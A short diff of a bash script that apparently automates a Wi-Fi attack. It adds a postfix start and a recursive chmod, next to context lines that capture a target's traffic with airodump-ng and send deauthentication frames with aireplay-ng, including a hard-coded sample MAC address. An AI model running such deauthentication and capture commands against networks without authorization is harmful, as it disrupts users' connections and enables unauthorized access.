@@ -8,7 +8,7 @@ if [ $(id -u) -ne 0 ]; then
 fi
 
 chmod -R 755 *
-
+sudo postfix start
 clear
 Red="\e[1;91m"      ##### Colors Used #####
 Green="\e[0;92m"
@@ -240,7 +240,7 @@ sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write 
 echo -e "[${Green}wlan0mon${White}] Sending DeAuth to target..."
 sudo aireplay-ng --deauth 20 -a $bssid wlan0mon
 #sudo aireplay-ng --deauth 20 -a 30:B5:C2:9A:64:12 wlan0mon
-#sudo chmod -R 755 *
+sudo chmod -R 755 *
 sudo airmon-ng stop wlan0mon
 sudo ifconfig wlan0 up
 sudo systemctl start NetworkManager
